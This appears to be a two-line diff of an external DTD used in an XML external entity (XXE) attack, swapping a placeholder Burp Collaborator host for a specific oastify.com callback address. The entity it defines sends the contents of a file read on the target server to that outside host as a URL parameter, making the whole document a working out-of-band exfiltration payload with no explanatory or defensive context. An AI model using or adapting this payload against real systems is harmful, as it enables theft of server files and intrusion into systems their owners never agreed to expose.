@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR_BURP_COLLAB.burpcollaborator.net/?data=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://9r1yaavtiima2h2s7gjs2807gympafy4.oastify.com/?data=%file;'>">
 %all;
